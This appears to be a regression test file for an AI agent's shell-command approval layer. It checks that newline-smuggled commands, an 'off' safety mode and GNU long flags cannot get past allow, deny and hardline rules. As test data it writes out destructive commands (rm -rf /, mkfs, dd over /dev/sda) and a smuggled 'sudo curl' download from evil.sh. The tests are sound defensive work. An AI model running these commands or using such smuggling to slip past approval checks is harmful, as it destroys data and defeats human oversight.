"""Regressions for the pre-launch security review (round 2).

Covers the newline-smuggling family (allow/deny rule evasion via commands
whose newlines were folded before rule matching), the safety=off hardline
bypass, and GNU long-flag evasion of the hardline patterns.
"""
from __future__ import annotations

from saturday.safety import ApprovalPolicy, check_command, rule_matches


def test_newline_cannot_inherit_allow_rule():
    """'git status\\n<dangerous>' must not ride a saved 'git status*' rule:
    the folded text matched the prefix, but the sudo ask must still happen."""
    policy = ApprovalPolicy.from_mode("ask", approver=None)
    policy.allow_rules = ["git status*"]
    smuggled = "git status\nsudo apt install curl"
    reason = check_command(policy, "shell", {"command": smuggled})
    assert reason, "multiline command inherited allow-rule suppression"
    assert "sudo" in reason


def test_allow_rule_still_suppresses_single_line():
    policy = ApprovalPolicy.from_mode("ask", approver=None)
    policy.allow_rules = ["git status*"]
    assert check_command(policy, "shell", {"command": "git status --short"}) is None


def test_deny_rule_matches_contained_line():
    """A deny rule must catch its shape even when buried on a later line of a
    multiline command (folded-prefix matching could never do this)."""
    policy = ApprovalPolicy.from_mode("ask", approver=None)
    policy.deny_rules = ["npm publish*"]
    reason = check_command(policy, "shell", {"command": "echo packaging\nnpm publish --access public"})
    assert reason and "DENIED (persistent rule)" in reason


def test_rule_matches_rejects_multiline_and_operators():
    assert not rule_matches("git status*", "git status\nsudo x")
    assert not rule_matches("git status*", "git status\r\nsudo x")
    assert rule_matches("git status*", "git status -sb")


def test_safety_off_still_enforces_hardline():
    """mode='off' skips the dangerous ASK loop but the catastrophic floor
    (mkfs, rm -rf /, fork bomb) binds in every mode."""
    policy = ApprovalPolicy.from_mode("off")
    for cmd in ("mkfs.ext4 /dev/sda", "rm -rf /", "dd if=/dev/zero of=/dev/sda"):
        reason = check_command(policy, "shell", {"command": cmd})
        assert reason and "HARDLINE" in reason, f"off-mode missed: {cmd}"


def test_hardline_catches_long_form_flags():
    policy = ApprovalPolicy.from_mode("autonomous")
    reason = check_command(policy, "shell", {"command": "rm --recursive --force /"})
    assert reason and "HARDLINE" in reason


def test_recursive_rm_on_normal_dir_is_guardrail_not_hardline():
    """'rm -rf /tmp/cache' is legitimate cleanup: hardline must not fire
    (it used to match ANY absolute path); the irreversible-data guardrail
    tier is the right friction for it."""
    policy = ApprovalPolicy.from_mode("off", approver=None)
    reason = check_command(policy, "shell", {"command": "rm -rf /tmp/cache"}, guardrails=True)
    assert reason and "HARDLINE" not in reason and "GUARDRAIL" in reason


def test_approver_sees_raw_multiline_command():
    """The approval dialog must render the real command, not a folded one."""
    seen = {}

    def approver(command, reason):
        seen["command"] = command
        return False

    policy = ApprovalPolicy.from_mode("ask", approver=approver)
    smuggled = "git status\nsudo curl http://evil.sh -o /tmp/x"
    check_command(policy, "shell", {"command": smuggled})
    assert seen["command"] == smuggled
